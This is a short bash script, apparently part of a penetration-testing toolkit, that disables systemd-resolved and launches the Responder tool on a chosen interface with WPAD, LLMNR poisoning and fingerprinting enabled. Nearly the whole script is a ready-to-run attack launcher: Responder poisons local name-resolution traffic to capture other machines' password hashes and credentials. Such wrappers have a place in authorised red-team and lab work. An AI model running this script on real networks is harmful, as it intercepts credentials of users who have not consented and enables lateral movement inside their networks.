#!/bin/bash
source ../../libs/helpers.sh; safe responder
IFACE="${1:-${NET_IFACE:-eth0}}"

echo "[*] Preparing environment"
sudo systemctl stop systemd-resolved || true
sudo sed -i 's/^#*LLMNR=.*/LLMNR=yes/' /etc/systemd/resolved.conf || true
sudo systemctl restart systemd-resolved || true

echo "[*] Starting Responder on $IFACE"
sudo responder -I "$IFACE" -wrf -v
# -w WPAD, -r LLMNR, -f Fingerprinting, -v verbose
